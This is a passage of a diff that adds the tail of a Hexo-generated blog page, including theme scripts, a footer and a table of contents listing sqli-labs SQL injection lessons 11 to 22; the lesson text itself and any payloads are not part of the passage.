+				app_key: "3333......", //获取APP KEY
+				placeholder: "no any!", //评论框占位提示文字        			
+			});
+			clearInterval(checkExistComment);
+		}
+	}, 100);
+</script>
+		
+	
+
+</div>
+
+<script type="text/javascript">
+	/* Show Comment */
+	var Annie_Comment = function() {
+		function Show_Hidden(obj) {
+			obj.style.display = 'block';
+		}
+		
+		//var obutton = $('#annie-comment-button');
+		//var obutton = $('#annie-comment-container');
+		var obutton = document.getElementById("annie-comment-button" || "0");
+		var odiv = document.getElementById("annie-comment-container");
+		if( 'obutton' ) {
+			obutton.onclick = function() {
+				Show_Hidden(odiv);
+				$("#annie-comment-button").css("display", 'none');
+				return false;
+			}
+		}
+	};
+
+	(function Annie_Init() {
+		Annie_Comment();
+	})();
+</script>
+		
+		<!--
+	时间：2018-09-24
+	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
+-->
+
+	
+		<aside class="post-widget">
+			<nav class="post-toc-wrap" id="post-toc">
+				
+					<strong>文章目录</strong>
+				
+				
+				<!--toc(post.content)-->
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#SQLI-和-sqli-labs"><span class="post-toc-text">SQLI 和 sqli-labs</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#基础知识"><span class="post-toc-text">基础知识</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-11-POST-–-Error-Based-–-Single-quotes-–-String-基于错误-单引号-字符串"><span class="post-toc-text">Less-11:POST – Error Based – Single quotes – String(基于错误-单引号-字符串)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-12-POST-–-Error-Based-–-Double-quotes-–-String-–-with-twist-基于错误-双引号-字符串-括号"><span class="post-toc-text">Less-12:POST – Error Based – Double quotes – String – with twist(基于错误-双引号-字符串-括号)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-13-POST-–-Double-Injection-–-Single-quotes-–-String-–-with-twist-双注入-单引号-字符串-括号"><span class="post-toc-text">Less-13:POST – Double Injection – Single quotes – String – with twist(双注入-单引号-字符串-括号)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-14-POST-–-Double-Injection-–-Single-quotes-–-String-–-with-twist-双注入-单引号-字符串-括号"><span class="post-toc-text">Less-14:POST – Double Injection – Single quotes – String – with twist(双注入-单引号-字符串-括号)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-15-POST-–-Blind-–-Boolian-time-Based-–-Single-quotes-盲注-基于布尔结果-基于时间延迟-单引号"><span class="post-toc-text">Less-15:POST – Blind – Boolian/time Based – Single quotes(盲注-基于布尔结果/基于时间延迟-单引号)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-16-POST-–-Blind-–-Boolian-time-Based-–-Double-quotes-盲注-基于布尔结果-基于时间延迟-双引号"><span class="post-toc-text">Less-16:POST – Blind – Boolian/time Based – Double quotes(盲注-基于布尔结果/基于时间延迟-双引号)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-17-POST-–-Update-Query-–-Error-Based-–-String-更新查询-基于错误-字符串"><span class="post-toc-text">Less-17:POST – Update Query – Error Based – String(更新查询-基于错误-字符串)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-18-POST-–-Header-Injection-–-Uagent-field-–-Error-based-头部注入-Uagent字段-基于错误"><span class="post-toc-text">Less-18:POST – Header Injection – Uagent field – Error based(头部注入-Uagent字段-基于错误)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入"><span class="post-toc-text">Less-19:POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入"><span class="post-toc-text">Less-20:POST - Cookie injections - Uagent field  - Error based (基于错误的cookie头部POST注入)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-21-Cookie-Injection-Error-Based-complex-string-基于错误的复杂的字符型Cookie注入"><span class="post-toc-text">Less-21:Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入"><span class="post-toc-text">Less-22:Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)</span></a></li></ol>
+			</nav>
+			<div class="post-toc-bar"><div>
+		</aside>
+	
+
+	</div>
+</div>
+		</div>
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="blog-text-center">
+		<div class="theme-annie-social">
+				
+				
+					<a href="http://github.com/" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
+					
+				
+					<a href="http://github.com/" title="Weibo" target="_blank"><i class="fa fa-weibo"></i>&nbsp;</a>
+				
+				
+					<a href="http://github.com/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
+					
+				
+					<a href="http://github.com/" title="QQ" target="_blank"><i class="fa fa-qq"></i>&nbsp;</a>
+					
+				
+					<a href="http://github.com/" title="Twitter" target="_blank"><i class="fa fa-twitter"></i>&nbsp;</a>
+						
+				
+		</div>
+	</div>
+
+	<div  class="blog-text-center">
+		<div class="theme-annie-copyright">
+			
+				&copy; 2017 - 2018, content by MR.TER. All Rights Reserved.			       	
+			
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
+		</div>
+	</div>
+</footer>
+		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->
+
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+
+<style>
+	.motto {
+		color: #000000;
+		font-size: 20px;
+		margin: 100px 25% 0;
+		width: 50%;
+		line-height: 1.4;
+		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
+		text-align: center;
+	}
+	@media(max-width: 890px) {
+		.motto {	
+			margin: 100px 10% 0;
+			width: 80%;
+		}
+	}
+	@media(max-width: 890px) {
+		.motto {
+			margin: 100px 5% 0;
+			width: 90%;
+		}
+	}
+</style>
+
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html(getMingYanContent());
+	</script>	
+
+
+
+
+
+
+
+	<script type="text/javascript" src="/js/toc.js"></script>
+
+
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript">
+	//generate a random img that pre_name 'from 0 to 110'
+	var random_bg = Math.floor(Math.random() * 109 + 1);
+
+	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
+	var bg = 'url(https://wu125.github.io/groundback/' + random_bg + '.jpg)';
+
+	$("#header-bg-2").css("background-image", bg);
+</script>
+		
+		<!--back to top-->
+        <style type="text/css">
+	#totop {
+		background: white;
+		border-radius: 50%;
+		position: fixed;
+		right: 5.4%;
+		bottom: 80px;
+		cursor: pointer;
+	}
+	
+	#totop a {
+		color: #474747;
+		background-color: transparent;
+		padding: 10px;
+		text-decoration: none;
+	}
+	
+	@media(max-width:512px) {
+		#totop {
+			display: none;
+			visibility: hidden;
+		}
+	}
+</style>
+
+
+	<div id="totop">
+  		<a href="javascript:;" class="fa fa-arrow-up"></a>
+	</div>
+
+	</body>
+	</html>
+
